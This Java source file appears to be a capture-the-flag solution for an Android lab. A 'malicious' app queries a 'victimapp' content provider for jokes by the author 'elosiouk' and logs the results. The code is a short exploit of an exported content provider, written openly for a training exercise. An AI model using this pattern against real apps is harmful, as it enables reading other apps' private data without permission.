package com.example.maliciousapp;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CTF";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "onCreate");

        /*
        1. create the content usi -> Uri.parse("content://com.example.victimapp.MyProvider/joke")
        Uri singleUri = ContentUris.withAppendedId(UserDictionary.Words.CONTENT_URI,4);
         */
        Uri contentUri = Uri.parse("content://com.example.victimapp.MyProvider/joke");

        /*
        2. create projection to only get the "joke" column

        String[] mProjection =
            {
                UserDictionary.Words._ID,    // Contract class constant for the _ID column name
                UserDictionary.Words.WORD,   // Contract class constant for the word column name
                UserDictionary.Words.LOCALE  // Contract class constant for the locale column name
            };
         */
        String[] mProjection = { "joke" };

        /*
        3. create selection clause
        String selectionClause = UserDictionary.Words.APP_ID + " LIKE ?";
         */
        String selectionClause = "author = ?";

        /*
        4. create selection args -> userl elosiouk
        String[] selectionArgs = {"user"};
         */
        String[] selectionArgs = { "elosiouk" };


        /*
        5. create the cursor with all the data created
        cursor = getContentResolver().query(
                UserDictionary.Words.CONTENT_URI,  // The content URI of the words table
                projection,                        // The columns to return for each row
                selectionClause,                   // Selection criteria
                selectionArgs,                     // Selection criteria
                sortOrder
         );
         */

        Cursor mCursor = getContentResolver().query(
                contentUri,         // The content URI
                mProjection,        // The columns to return
                selectionClause,    // The WHERE clause
                selectionArgs,      // The values for the WHERE clause
                null                // Sort order (we don't care)
        );


        /*
            6. find mCursor != null and show it all in the logcat
        */

        if (mCursor != null) {
            Log.d(TAG, "Found " + mCursor.getCount() + " jokes");
            while (mCursor.moveToNext()) {
                // Get the index of the column we requested
                int index = mCursor.getColumnIndex("joke");

                // Read the string
                String jokeText = mCursor.getString(index);

                // VARIATION: Just Log it (No concatenation)
                Log.d(TAG, "Found Joke: " + jokeText);
            }

            // Always close the cursor to avoid memory leaks
            mCursor.close();
        } else {
            Log.d(TAG, "Cursor is null, query failed");
        }


    }
}